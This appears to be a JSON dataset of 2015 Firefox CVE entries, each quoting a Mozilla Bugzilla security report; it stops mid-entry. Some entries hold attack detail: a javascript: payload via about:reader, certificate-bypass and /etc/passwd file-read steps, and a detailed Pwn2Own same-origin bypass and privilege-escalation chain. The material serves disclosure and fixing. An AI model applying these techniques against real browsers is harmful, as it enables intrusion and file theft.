{
  "year": 2015,
  "total": 180,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2015-0798": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1147597",
        "title": "Privileged URLs processed by about:reader",
        "description": "The about:reader page can be opened from an unprivileged context, accepting any protocol in the \"url\" parameter. If parsing of the target document fails, the browser will eventually redirect to the specified URL. Therefore, this link will redirect to the XUL document without any user interaction: about:reader?url=chrome://browser/content/browser.xul If a javascript: link is given, the script executes when the user tries to close the reader view (navigate back to the \"original page\"): about:reader?url=javascript:alert(document.location) The JS payload then evaluates in the about:reader context (which does not have chrome privileges)."
      }
    ],
    "CVE-2015-0799": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1148328",
        "title": "Server certificate verification bypass with Alt-Svc",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2342.2 Safari/537.36 Steps to reproduce: (1) Launch https://mallory.csrf.jp:8020/altsvccertbypass/ (2) You can see the certificate error page. This is a correct behavior. (3) Launch http://csrf.jp/altsvccertbypass/ . This page sets Alt-Svc header h2=\"mallory.csrf.jp:8020\". (4) Reload the page. (5) Instead of the page shown in (3), https://mallory.csrf.jp:8020/altsvccertbypass/ is shown as an alternative http/2 service. (6) Open a new tab and launch https://mallory.csrf.jp:8020/altsvccertbypass/ again. (7) You can NOT see the certificate error page. Actual results: In above (5) and (7), invalid certificate page https://mallory.csrf.jp:8020/altsvccertbypass/ is shown. Expected results: The server certificate used by mallory.csrf.jp:8020 is only valid for 'csrf.jp' and 'alice.csrf.jp'. Firefox should not show the page."
      }
    ],
    "CVE-2015-0800": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1110212",
        "title": "Fennec name resolver uses weak DNS randomness (see CVE-2012-2808)",
        "description": "Our own DNS resolving code is based on an older Android/bionic version. That older code uses a weak random algorithm for the ID in the DNS resolves, which makes it vulnerable to DNS poisoning attacks. See URL that links to an IBM report about this problem. This problem has since been fixed in the upstream bionic tree."
      }
    ],
    "CVE-2015-0801": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1146339",
        "title": "A variant of Bug 1144988 lets one bypass same-origin policy",
        "description": "Bz got this idea 1) Start a new load. 2) Do an anchor scroll (this does not cancel the load, iirc). 3) Use the mutation event to wait until the load we started completes. There are few options to fix this, at least * Use the original patch for bug 1144988 * Add some more checks to doShortCircuitedLoad so that we just bail out early if anchor scrolling changes docshell's state to something unexpected."
      }
    ],
    "CVE-2015-0802": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1124898",
        "title": "Privileged Window.webidl stuff is exposed based on the docshell type, not the principal of the actual page",
        "description": "From bug 1120261. > setTimeout(function(){ > x.messageManager.loadFrameScript('data:,throw Components.utils', > false); This is the most egregious bit, IMO. it looks like Window.webidl puts all of the privileged stuff behind Func=\"nsGlobalWindow::IsChromeWindow\", rather than making it ChromeOnly. This means that, if content can ever get a reference to a chrome window (which it shouldn't, but can happen when paired with another exploit as in this bug), it can navigate that window to its own page, and go wild on chrome-privileged stuff. Boris, is there any reason for the above? Seems like we should almost certainly fix it."
      }
    ],
    "CVE-2015-0803": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1134561",
        "title": "Type confusion in HTMLSourceElement::AfterSetAttr",
        "description": "The issue can be triggered while setting a specific attribute (srcset,sizes,media,type) of a <source> element. When iterating over the sibling elements in order to find an HTMLImageElement this function does only check the tag name and not the namespace: nsresult HTMLSourceElement::AfterSetAttr(int32_t aNameSpaceID, nsIAtom* aName, const nsAttrValue* aValue, bool aNotify) { // If we are associated with a <picture> with a valid <img>, notify it of // responsive parameter changes nsINode *parent = nsINode::GetParentNode(); if (aNameSpaceID == kNameSpaceID_None && (aName == nsGkAtoms::srcset || aName == nsGkAtoms::sizes || aName == nsGkAtoms::media || aName == nsGkAtoms::type) && parent && parent->Tag() == nsGkAtoms::picture) { nsString strVal = aValue ? aValue->GetStringValue() : EmptyString(); // Find all img siblings after this <source> and notify them of the change nsCOMPtr<nsINode> sibling = AsContent(); while ( (sibling = sibling->GetNextSibling()) ) { if (sibling->Tag() == nsGkAtoms::img) { HTMLImageElement *img = static_cast<HTMLImageElement*>(sibling.get()); if (aName == nsGkAtoms::srcset) { img->PictureSourceSrcsetChanged(AsContent(), strVal, aNotify); } else if (aName == nsGkAtoms::sizes) { img->PictureSourceSizesChanged(AsContent(), strVal, aNotify); } else if (aName == nsGkAtoms::media || aName == nsGkAtoms::type) { img->PictureSourceMediaOrTypeChanged(AsContent(), aNotify); } } } This results in a cast of an object which isn't an HTMLImageElement to this type. The attached testcase demonstrates this behaviour. ASan output attached as well. ASan detects this as a use-after-free issue."
      }
    ],
    "CVE-2015-0804": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1134560",
        "title": "Type confusion in HTMLSourceElement::BindToTree",
        "description": "When binding a <source> element to a tree the functions checks for any siblings of the type <img>. It fails to validate the namespace and only checks for the tag name: if (aParent && aParent->IsNodeOfType(nsINode::eMEDIA)) { HTMLMediaElement* media = static_cast<HTMLMediaElement*>(aParent); media->NotifyAddedSource(); } else if (aParent && aParent->Tag() == nsGkAtoms::picture) { // Find any img siblings after this <source> and notify them nsCOMPtr<nsINode> sibling = AsContent(); while ( (sibling = sibling->GetNextSibling()) ) { if (sibling->Tag() == nsGkAtoms::img) { HTMLImageElement *img = static_cast<HTMLImageElement*>(sibling.get()); img->PictureSourceAdded(AsContent()); } } } This can result in a type confusion. See attached testcase which demonstrates the issue. ASan detects this issue as a use-after-free (output attached). This vulnerability can also be triggered on the stable release version of Firefox without <picture> being enabled as the check in the code only validates the tag name. The testcase on crashes on Windows accessing on mapped memory during garbage collection."
      }
    ],
    "CVE-2015-0807": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1111834",
        "title": "CORS request after preflight should not follow 30x redirect",
        "description": "Follow up on Bug 1080987. As explained in [1], a CORS reqeust after preflight shouldn't follow 30x redirect, see spec [2]. [1] https://bugzilla.mozilla.org/show_bug.cgi?id=1080987#c3 [2] http://www.w3.org/TR/cors/#cross-origin-request-with-preflight-0"
      }
    ],
    "CVE-2015-0810": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1125013",
        "title": "Mozilla Firefox for Mac OS X : Cursor can be totally invisible using flash object and div",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0 Build ID: 20150108202552 Steps to reproduce: When you go on a flash object (with the cursor) that defined the cursor like invisible and a <div> transparent object (transparent obligatory) covers this flash object, the cursor is now totally invisible. This flaw can be in used in combination with an image of the cursor manipulated through JavaScript, leading to clickjacking during interactions with HTML content subsequently. I have coded a PoC with the same interaction/severity as the PoC for bug995603 (the difference between this two bugs is : in bug995603 (RESOLVED/FIXED) , the cursor is on the flash object and a some <div> will cover a part of this flash object , and the bug appear when you move the cursor to the <div>. in this new bug (WORKS ON STABLE/BETA AND OTHERS VERSION OF FIREFOX) , the <div> will directly cover the totality of the flash object . steps: 1 : Go to the flash object with the cursor (don't click on the flash object) 2 : Wait 2 s 3 : The cursor is totally invisible on all element/ button (on webpage or firefox elements) / addon window or what you want i will upload a video that demonstrates this vulnerability Actual results: This flaw can be in used in combination with an image of the cursor manipulated through JavaScript, leading to clickjacking during interactions with HTML content subsequently. Expected results: The cursor is totally invisible on all element/ button (on webpage or firefox elements) / addon window or what you want"
      }
    ],
    "CVE-2015-0811": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1132468",
        "title": "[qcms] heap info leak",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36 Steps to reproduce: Load sample 98c8e33029be249da9724c3836486677 or 11dcaacb804945e4574317fc56ebc5d3 in a transformation. Actual results: heap-buffer-overflow READ of size 4 lut_interp_linear_float third_party/qcms/src/transform_util.c:101:17 or Program received signal SIGSEGV, Segmentation fault. lut_interp_linear_float (value=1.35335546e+18, table=0x7ffff6a02050, length=0) at third_party/qcms/src/transform_util.c:101 101 value = table[upper]*(1. - (upper - value)) + table[lower]*(upper - value); float lut_interp_linear_float(float value, float *table, size_t length) { int upper, lower; value = value * (length - 1); // If length is 0, value will have been adjusted to an arbitrary large float. upper = ceil(value); lower = floor(value); value = table[upper]*(1. - (upper - value)) + table[lower]*(upper - value); // Here the ASAN alert or SIGSEGV occurs. return value; } Potentially this can be used for disclosing memory contents."
      }
    ],
    "CVE-2015-0816": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1144991",
        "title": "Privilege escalation from resource:// document (e.g. pdf viewer) (ZDI-CAN-2826)",
        "description": "From winning Pwn2Own entry by Mariusz Mlynski [2/2]: ----------------------- 2. PRIVILEGE ESCALATION ----------------------- This is an extension of the cross-origin bypass vulnerability. The internal pdf viewer in Firefox executes with the \"resource://pdf.js/web/viewer.html\" security principal. It's unprivileged, but the handling of \"resource:\" principals with respect to loading permissions is incorrect, as documented in the source code: >>>>>>>>>>>>>>>>>>>>>> /caps/nsScriptSecurityManager.cpp >>>>>>>>>>>>>>>>>>>>>>> NS_IMETHODIMP nsScriptSecurityManager::CheckLoadURIWithPrincipal(nsIPrincipal* aPrincipal, nsIURI *aTargetURI, uint32_t aFlags) { (...) // Check for chrome target URI rv = NS_URIChainHasFlags(targetBaseURI, nsIProtocolHandler::URI_IS_UI_RESOURCE, &hasFlags); NS_ENSURE_SUCCESS(rv, rv); if (hasFlags) { (...) // resource: and chrome: are equivalent, securitywise // That's bogus!! Fix this. But watch out for // the view-source stylesheet? bool sourceIsChrome; rv = NS_URIChainHasFlags(sourceBaseURI, nsIProtocolHandler::URI_IS_UI_RESOURCE, &sourceIsChrome); NS_ENSURE_SUCCESS(rv, rv); if (sourceIsChrome) { return NS_OK; } if (reportErrors) { ReportError(nullptr, errorTag, sourceURI, aTargetURI); } return NS_ERROR_DOM_BAD_URI; } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< The nsIProtocolHandler::URI_IS_UI_RESOURCE flag is set for chrome:, resource:, and moz-icon: URIs. They're all free to load other URIs with this flag, including chrome-privileged pages under \"chrome:\". This bogus treatment of resource: principals paves the way for a privilege escalation in the event of a cross-origin bypass, such as the one described above. The attacker can use the session history confusion to execute code in the context of the pdf viewer and then re-use the said attack to compromise a privileged page, allowing for javascript code execution with the system principal."
      }
    ],
    "CVE-2015-0818": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1144988",
        "title": "Same-origin bypass via SVG hash navigation (ZDI-CAN-2825)",
        "description": "From winning Pwn2Own exploit by Mariusz Mlynski [1/2]: ----- TL;DR ----- It is possible to bypass the same-origin policy using a mutation event triggered in the middle of a SVG document's hash navigation. This can be exploited to execute script in the context of the internal pdf viewer, whose security principal is not restricted from loading privileged content, which allows web content to execute arbitrary code. ---------------------- 1. CROSS-ORIGIN BYPASS ---------------------- In Firefox, short-circuited hash navigations are handled as follows: >>>>>>>>>>>>>>>>>>>>>>>> /docshell/base/nsDocShell.cpp >>>>>>>>>>>>>>>>>>>>>>>>> NS_IMETHODIMP nsDocShell::InternalLoad(nsIURI * aURI, (...) ) { (...) if (doShortCircuitedLoad) { // Save the position of the scrollers. nscoord cx = 0, cy = 0; GetCurScrollPos(ScrollOrientation_X, &cx); GetCurScrollPos(ScrollOrientation_Y, &cy); // ScrollToAnchor doesn't necessarily cause us to scroll the window; // the function decides whether a scroll is appropriate based on the // arguments it receives. But even if we don't end up scrolling, // ScrollToAnchor performs other important tasks, such as informing // the presShell that we have a new hash. See bug 680257. rv = ScrollToAnchor(curHash, newHash, aLoadType); NS_ENSURE_SUCCESS(rv, rv); (...) /* This is a anchor traversal with in the same page. * call OnNewURI() so that, this traversal will be * recorded in session and global history. */ nsCOMPtr<nsISupports> owner; if (mOSHE) { mOSHE->GetOwner(getter_AddRefs(owner)); } // Pass true for aCloneSHChildren, since we're not // changing documents here, so all of our subframes are // still relevant to the new session history entry. // // It also makes OnNewURI(...) set LOCATION_CHANGE_SAME_DOCUMENT // flag on firing onLocationChange(...). // Anyway, aCloneSHChildren param is simply reflecting // doShortCircuitedLoad in this scope. OnNewURI(aURI, nullptr, owner, mLoadType, true, true, true); (...) return NS_OK; } (...) } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< This code doesn't consider that |ScrollToAnchor| can run script if the following conditions are met: 1. A SVG document is being navigated; 2. A DOMAttrModified mutation listener is registered on the SVG document's documentElement; 3. The hash modifies a SVGViewAttribute through the use of a SVG ViewSpec, such as \"svgView(viewBox(0,0,0,0))\". In such case, the following code path is taken to trigger a mutation event: nsDocShell::InternalLoad nsDocShell::ScrollToAnchor PresShell::GoToAnchor mozilla::SVGFragmentIdentifier::ProcessFragmentIdentifier mozilla::SVGFragmentIdentifier::ProcessSVGViewSpec nsSVGViewBox::SetBaseValueString nsSVGElement::DidChangeViewBox nsSVGElement::DidChangeValue mozilla::dom::Element::SetAttrAndNotify The event handler can perform a synchronous navigation to a cross-origin document, affecting the state of the docshell and its corresponding history entry stored in nsDocShell::mOSHE. When the handler returns, the security principal associated with the docshell's current history entry (which is cross-origin at this point) is fetched in the mOSHE->GetOwner call. Then, |OnNewURI| combines the URI of the SVG document and the cross-origin owner into a new history entry, which is added to the session history. This allows an attacker to load a principal-inheriting data:image/svg+xml,* URI with the hijacked principal during a subsequent navigation to the newly added history entry (|history.go(2)| in the exploit)."
      }
    ],
    "CVE-2015-0821": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1111960",
        "title": "Open any pseudo URL (e.g. chrome://) when manually calling a link in a new tab",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0 Build ID: 20141201171754 Steps to reproduce: (I admit that this report is a little awkward, but a serious impact is given anyways.) If you force a link to a new tab or window by holding CTRL or SHIFT, every href url will be openend, regardless of the security context. Steps: - Create an <a> link to a chrome:// or file:// url. - Trigger the link while holding the SHIFT or CTRL key. - The specified url will be loaded, disregarding all context restrictions. A sneaky attack could take advantage of the fact that SHIFT+CR is a common user action. (In Facebook's chat for instance, this will expand your input box with a newline char instead of submitting the text.) So, if you focus() a hidden link on page load, pressing SHIFT + ENTER in any context is sufficient to potentially compromise your system. Besides that, a lot of people should be used to CTRL-open most links anyways and will therefore be an easy target. The superfluously attached proof of concept will open chrome://browser/content/blockedSite.xhtml. Expected results: Links should respect equal context restrictions for every way of invocation."
      }
    ],
    "CVE-2015-0822": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1110557",
        "title": "Arbitrary File Read Vulnerability via Form Autocomplete",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0 Build ID: 20141201171754 Steps to reproduce: - Create a <input type=\"text\"> field. - Make sure, that the field's autocompletion will suggest \"/etc/passwd\" when triggered. - Open the completion dropdown menu (which should solely suggest \"/etc/passwd\") by clicking in the text box or pressing the appropriate keys. - With the menu still open, change the input type from \"text\" to \"file\". - Although the input type changed, the completion menu does not dissapear and you will still be able to accept the filename as an autocompletion value. - After completion the file picker has changed its value to \"/etc/passwd\" and will thus immediately make the file contents available to the DOM. Confirmed on 3.17.4-1-ARCH x86_64 GNU/Linux. Actual results: If you try to change the value of a <input> field with type=file, you will get a security violation error. This restriction does not apply to chrome UI elements, though. The autocompletion box can therefore be abused the change otherwise inaccessible values and bypass the file upload dialogue. The attached proof of concept outlines a possible real-life scenario, which tries to minimize the necessary user interactions to a simple double click. (Just for the record, there should be several ways to conceal the whole autocompletion process even more, making the attack much less obvious than depicted here, but probably resulting in a less stable and bloated PoC.) Expected results: The attempt of autocompleting a file upload form field should trigger a security error."
      }
    ],
    "CVE-2015-0824": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1095925",
        "title": "SEGV in mozilla::layers::BufferTextureClient::AllocateForSurface",
        "description": "Tested on: OS: Ubuntu 14.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1415445665/ I'm guessing the component which this issue belongs to. Feel free to change it if I got it wrong. Repro-file as an attachment. Note: You might need to resize firefox window to find the correct size where crash occurs. ASAN-trace: GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(34013184,2) Cairo Status: 32 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(34013184,2) Cairo Status: 32 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(8421376,1) Cairo Status: 32 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(8421376,1) Cairo Status: 32 ASAN:SIGSEGV ================================================================= ==14686==ERROR: AddressSanitizer: SEGV on unknown address 0x7f2229ae2000 (pc 0x7f235ac9709d sp 0x7fff815ce9b8 bp 0x7fff815ce9f0 T0) #0 0x7f235ac9709c in memset ??:0:0 #1 0x45f042 in __interceptor_memset _asan_rtl_:0 #2 0x7f235ea334df in mozilla::layers::BufferTextureClient::AllocateForSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::layers::TextureAllocationFlags) /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/TextureClient.cpp:677:0 #3 0x7f235ea22614 in mozilla::layers::TextureClient::CreateForDrawing(mozilla::layers::ISurfaceAllocator*, mozilla::gfx::SurfaceFormat, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::gfx::BackendType, mozilla::layers::TextureFlags, mozilla::layers::TextureAllocationFlags) /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/TextureClient.cpp:350:0 #4 0x7f235ea249b3 in CreateTextureClientForDrawing /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/CompositableClient.cpp:210:0 #5 0x7f235ea249b3 in mozilla::layers::ContentClientRemoteBuffer::CreateBackBuffer(nsIntRect const&) /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/ContentClient.cpp:302:0 #6 0x7f235ea24f2a in BuildTextureClients /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/ContentClient.cpp:295:0 #7 0x7f235ea24f2a in mozilla::layers::ContentClientRemoteBuffer::CreateBuffer(gfxContentType, nsIntRect const&, unsigned int, mozilla::RefPtr<mozilla::gfx::DrawTarget>*, mozilla::RefPtr<mozilla::gfx::DrawTarget>*) /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/client/ContentClient.cpp:331:0 #8 0x7f235e982c8b in mozilla::layers::RotatedContentBuffer::BeginPaint(mozilla::layers::PaintedLayer*, unsigned int) /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/layers/RotatedBuffer.cpp:648:0 #9 0x7f235ea36021 in mozilla::layers::ContentClientRemoteBuffer::BeginPaintBuffer(mozilla::layers::PaintedLayer*, unsigned int) /builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/gfx/layers/../../dist/include/mozilla/layers/ContentClient.h:214:0 . . . Output from debug build: https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan-debug/1415445665/ . . . [Child 15255] WARNING: Overflowed nscoord_MAX in conversion to nscoord height: file ../../dist/include/nsRect.h, line 95 [Child 15255] WARNING: Overflowed nscoord_MAX in conversion to nscoord height: file ../../dist/include/nsRect.h, line 95 [Child 15255] WARNING: Surface size too large (exceeds caller's limit)!: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxASurface.cpp, line 394 [Child 15255] ###!!! ASSERTION: creating Xlib surface failed!: 'Error', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/basic/TextureClientX11.cpp, line 113 [Child 15255] WARNING: Failed to allocate a TextureClient, falling back to BufferTextureClient.: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/client/TextureClient.cpp, line 344 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(34013184,2) Cairo Status: 32 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(34013184,2) Cairo Status: 32 [Child 15255] WARNING: Surface size too large (exceeds caller's limit)!: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxASurface.cpp, line 394 [Child 15255] ###!!! ASSERTION: creating Xlib surface failed!: 'Error', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/basic/TextureClientX11.cpp, line 113 [Child 15255] WARNING: Failed to allocate a TextureClient, falling back to BufferTextureClient.: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/client/TextureClient.cpp, line 344 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(8421376,1) Cairo Status: 32 GFX ERROR: Attempt to create DrawTarget for invalid surface. Size(8421376,1) Cairo Status: 32 [Child 15255] WARNING: Surface size too large (exceeds caller's limit)!: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxASurface.cpp, line 394 [Child 15255] WARNING: Surface size too large (would overflow)!: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxASurface.cpp, line 411 [Child 15255] ###!!! ASSERTION: creating Xlib surface failed!: 'Error', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/basic/TextureClientX11.cpp, line 113 [Child 15255] WARNING: Failed to allocate a TextureClient, falling back to BufferTextureClient.: file /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/layers/client/TextureClient.cpp, line 344 Program /home/attekett/Downloads/firefox-debug/plugin-container (pid = 15255) received signal 11. Stack: #01: ???[/lib/x86_64-linux-gnu/libpthread.so.0 +0x10340] #02: memset[/lib/x86_64-linux-gnu/libc.so.6 +0x8d09d] #03: memset[/home/attekett/Downloads/firefox-debug/plugin-container +0x60ee3] ###!!! [Parent][MessageChannel] Error: Channel error: cannot send/recv . . ."
      }
    ],
    "CVE-2015-0825": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1092370",
        "title": "Stack-buffer-underflow in mozilla::MP3FrameParser::ParseBuffer",
        "description": "Tested on: OS: Ubuntu 14.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1414786499/ ASAN-trace: ==22054==ERROR: AddressSanitizer: stack-buffer-underflow on address 0x7fb891d460b9 at pc 0x7fb8c5380eaa bp 0x7fb891d45ea0 sp 0x7fb891d45e98 READ of size 1 at 0x7fb891d460b9 thread T46 (Media Decode #1) #0 0x7fb8c5380ea9 in mozilla::MP3FrameParser::ParseBuffer(unsigned char const*, unsigned int, long, unsigned int*) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/MP3FrameParser.cpp:336:0 #1 0x7fb8c53812a7 in mozilla::MP3FrameParser::Parse(char const*, unsigned int, unsigned long) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/MP3FrameParser.cpp:470:0 #2 0x7fb8c5632a08 in mozilla::GStreamerReader::ParseMP3Headers() /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/gstreamer/GStreamerReader.cpp:285:0 #3 0x7fb8c5632e63 in mozilla::GStreamerReader::ReadMetadata(mozilla::MediaInfo*, nsDataHashtable<nsCStringHashKey, nsCString>**) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/gstreamer/GStreamerReader.cpp:326:0 #4 0x7fb8c53c98dd in mozilla::MediaDecoderStateMachine::DecodeMetadata() /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/MediaDecoderStateMachine.cpp:1948:0 #5 0x7fb8c53c7162 in mozilla::MediaDecoderStateMachine::CallDecodeMetadata() /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/MediaDecoderStateMachine.cpp:1924:0 #6 0x7fb8c54254b0 in nsRunnableMethodImpl<void (mozilla::MediaDecoderStateMachine::*)(), void, true>::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/dom/media/../../dist/include/nsThreadUtils.h:388:0 . . . Address 0x7fb891d460b9 is located in stack of thread T46 (Media Decode #1) at offset 25 in frame #0 0x7fb8c563283f in mozilla::GStreamerReader::ParseMP3Headers() /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/gstreamer/GStreamerReader.cpp:272:0 This frame has 2 object(s): [32, 4128) 'bytes' <== Memory access at offset 25 underflows this variable [4256, 4260) 'bytesRead' Thread T46 (Media Decode #1) created by T45 (Media S~hine #1) here: #0 0x45e5e5 in __interceptor_pthread_create _asan_rtl_:0 #1 0x7fb8ce970d8d in _PR_CreateThread /builds/slave/m-cen-l64-asan-000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c:453:0 #2 0x7fb8ce97090a in PR_CreateThread /builds/slave/m-cen-l64-asan-000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c:544:0 #3 0x7fb8c15134db in nsThread::Init() /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsThread.cpp:455:0 #4 0x7fb8c1518d3c in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsThreadManager.cpp:269:0 #5 0x7fb8c151a298 in nsThreadPool::PutEvent(nsIRunnable*) /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsThreadPool.cpp:101:0 #6 0x7fb8c151b9d9 in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsThreadPool.cpp:261:0 #7 0x7fb8c5418cbb in mozilla::MediaTaskQueue::DispatchLocked(mozilla::TemporaryRef<nsIRunnable>, mozilla::MediaTaskQueue::DispatchMode) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/media/MediaTaskQueue.cpp:53:0"
      }
    ],
    "CVE-2015-0826": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1092363",
        "title": "Heap-buffer-overflow in nsTransformedTextRun::SetCapitalization",
        "description": "Tested on: OS: Ubuntu 14.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1414761627/ From stack-trace I would say this is related to bug 1041512 ASAN-trace: ==21046==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c000352148 at pc 0x7f5f34d4cb35 bp 0x7ffff9536760 sp 0x7ffff9536758 READ of size 8 at 0x60c000352148 thread T0 #0 0x7f5f34d4cb34 in Length /builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/layout/generic/../../dist/include/nsTArray.h:330:0 #1 0x7f5f34d4cb34 in IsEmpty /builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/layout/generic/../../dist/include/nsTArray.h:333:0 #2 0x7f5f34d4cb34 in nsTransformedTextRun::SetCapitalization(unsigned int, unsigned int, bool*, gfxContext*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextRunTransformations.cpp:60:0 #3 0x7f5f319942ca in nsLineBreaker::AppendText(nsIAtom*, char16_t const*, unsigned int, unsigned int, nsILineBreakSink*) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/base/nsLineBreaker.cpp:291:0 #4 0x7f5f31994cfb in nsLineBreaker::AppendText(nsIAtom*, unsigned char const*, unsigned int, unsigned int, nsILineBreakSink*) /builds/slave/m-cen-l64-asan-000000000000000/build/dom/base/nsLineBreaker.cpp:327:0 #5 0x7f5f34d04465 in BuildTextRunsScanner::SetupBreakSinksForTextRun(gfxTextRun*, void const*, unsigned int) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:2418:0 #6 0x7f5f34cfa893 in BuildTextRunsScanner::SetupLineBreakerContext(gfxTextRun*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:2323:0 #7 0x7f5f34cf8a93 in BuildTextRunsScanner::FlushFrames(bool, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1462:0 #8 0x7f5f34d015fd in BuildTextRunsScanner::ScanFrame(nsIFrame*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1702:0 #9 0x7f5f34d017dc in BuildTextRunsScanner::ScanFrame(nsIFrame*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1712:0 #10 0x7f5f34d06ee5 in BuildTextRuns /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1385:0 #11 0x7f5f34d06ee5 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:2578:0 . . . 0x60c000352148 is located 12 bytes to the right of 124-byte region [0x60c0003520c0,0x60c00035213c) allocated by thread T0 here: #0 0x471d71 in malloc _asan_rtl_:0 #1 0x7f5f3139afc9 in AllocateStorageForTextRun /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/thebes/gfxTextRun.cpp:108:0 #2 0x7f5f3139afc9 in Create /builds/slave/m-cen-l64-asan-000000000000000/build/gfx/thebes/gfxTextRun.cpp:125:0 #3 0x7f5f3139afc9 in gfxFontGroup::MakeSpaceTextRun(gfxTextRunFactory::Parameters const*, unsigned int) 